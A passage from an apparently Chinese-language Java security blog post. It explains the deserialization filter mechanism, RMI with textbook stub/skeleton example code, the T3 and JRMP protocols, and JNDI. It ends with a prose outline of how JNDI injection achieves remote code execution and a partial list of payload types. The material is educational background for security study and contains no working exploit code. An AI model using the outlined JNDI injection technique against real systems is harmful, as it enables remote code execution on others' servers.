进行了支持。这个机制主要描述了如下的机制：</p>\n<ul>\n<li>提供一个限制反序列化类的机制，白名单或者黑名单</li>\n<li>限制反序列化的深度和复杂度</li>\n<li>为 RMI 远程调用对象提供了一个验证类的机制</li>\n<li>定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器</li>\n</ul>\n<h1 id=\"rmi\"><a class=\"anchor\" href=\"#rmi\">#</a> RMI</h1>\n<h2 id=\"简介-11\"><a class=\"anchor\" href=\"#简介-11\">#</a> 简介</h2>\n<p>RMI (Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、Spring RMI 等不同的实现。</p>\n<p>RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。</p>\n<h2 id=\"调用步骤\"><a class=\"anchor\" href=\"#调用步骤\">#</a> 调用步骤</h2>\n<ul>\n<li>客户调用客户端辅助对象 Stub 上的方法</li>\n<li>客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton</li>\n<li>服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>\n<li>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton</li>\n<li>服务端辅助对象将结果打包，发送给客户端辅助对象 Stub</li>\n<li>客户端辅助对象将返回值解包，返回给调用者</li>\n<li>客户获得返回值</li>\n</ul>\n<h2 id=\"样例\"><a class=\"anchor\" href=\"#样例\">#</a> 样例</h2>\n<p>一份代码样例如下 (来自《Enterprise JavaBeans》)：</p>\n<h3 id=\"person接口定义\"><a class=\"anchor\" href=\"#person接口定义\">#</a> Person 接口定义</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"使用personserver实现person\"><a class=\"anchor\" href=\"#使用personserver实现person\">#</a> 使用 PersonServer 实现 Person</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">PersonServer</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">PersonServer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"使用person_stub实现person\"><a class=\"anchor\" href=\"#使用person_stub实现person\">#</a> 使用 Person_Stub 实现 Person</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Socket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person_Stub</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Socket</span> socket<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person_Stub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// connect to skeleton</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        socket <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Socket</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"computer_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// pass method name to skeleton</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"age\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\">// pass method name to skeleton</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"skeleton的实现\"><a class=\"anchor\" href=\"#skeleton的实现\">#</a> Skeleton 的实现</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Socket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServerSocket</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person_Skeleton</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Thread</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">PersonServer</span> myServer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person_Skeleton</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">PersonServer</span> server<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// get reference of object server</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>myServer <span class=\"token operator\">=</span> server<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token comment\">// new socket at port 9000</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">ServerSocket</span> serverSocket <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServerSocket</span><span class=\"token punctuation\">(</span><span class=\"token number\">9000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token comment\">// accept stub's request</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">Socket</span> socket <span class=\"token operator\">=</span> serverSocket<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>socket <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token comment\">// get stub's request</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token class-name\">ObjectInputStream</span> inStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token class-name\">String</span> method <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>inStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token comment\">// check method name</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"age\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token comment\">// execute object server's business method</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    <span class=\"token keyword\">int</span> age <span class=\"token operator\">=</span> myServer<span class=\"token punctuation\">.</span><span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token comment\">// return result to stub</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                    <span class=\"token comment\">// execute object server's business method</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                    <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> myServer<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                    <span class=\"token class-name\">ObjectOutputStream</span> outStream <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token comment\">// return result to stub</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                    outStream<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> t<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> args <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token comment\">// new object server</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token class-name\">PersonServer</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PersonServer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Richard\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token class-name\">Person_Skeleton</span> skel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person_Skeleton</span><span class=\"token punctuation\">(</span>person<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        skel<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"client实现\"><a class=\"anchor\" href=\"#client实现\">#</a> Client 实现</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">PersonClient</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">Person</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person_Stub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">int</span> age <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\" is \"</span> <span class=\"token operator\">+</span> age <span class=\"token operator\">+</span> <span class=\"token string\">\" years old\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> t<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            t<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"t3协议\"><a class=\"anchor\" href=\"#t3协议\">#</a> T3 协议</h2>\n<p>T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。</p>\n<h2 id=\"jrmp\"><a class=\"anchor\" href=\"#jrmp\">#</a> JRMP</h2>\n<p>Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。</p>\n<p>JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java 对象。</p>\n<h1 id=\"jndi\"><a class=\"anchor\" href=\"#jndi\">#</a> JNDI</h1>\n<h2 id=\"简介-12\"><a class=\"anchor\" href=\"#简介-12\">#</a> 简介</h2>\n<p>JNDI (Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。</p>\n<p>其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。</p>\n<p><img data-src=\"https://s2.loli.net/2022/11/27/e7VaR9mvNITk6U1.png\" alt=\"\" /></p>\n<h2 id=\"jndi注入\"><a class=\"anchor\" href=\"#jndi注入\">#</a> JNDI 注入</h2>\n<p>JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的  <code>A Journey From JNDI LDAP Manipulation To RCE</code>  议题提出的。</p>\n<p>其攻击过程如下</p>\n<ol>\n<li>攻击者将 Payload 绑定到攻击者的命名 / 目录服务中</li>\n<li>攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法</li>\n<li>应用程序执行查找</li>\n<li>应用程序连接到攻击者控制的 JNDI 服务并返回 Payload</li>\n<li>应用程序解码响应并触发有效负载</li>\n</ol>\n<h2 id=\"攻击载荷\"><a class=\"anchor\" href=\"#攻击载荷\">#</a> 攻击载荷</h2>\n<p>JDNI 主要有几种攻击载荷：</p>\n<ul>\n<li>CORBA</li>\n<li>IOR</li>\n<li>JNDI 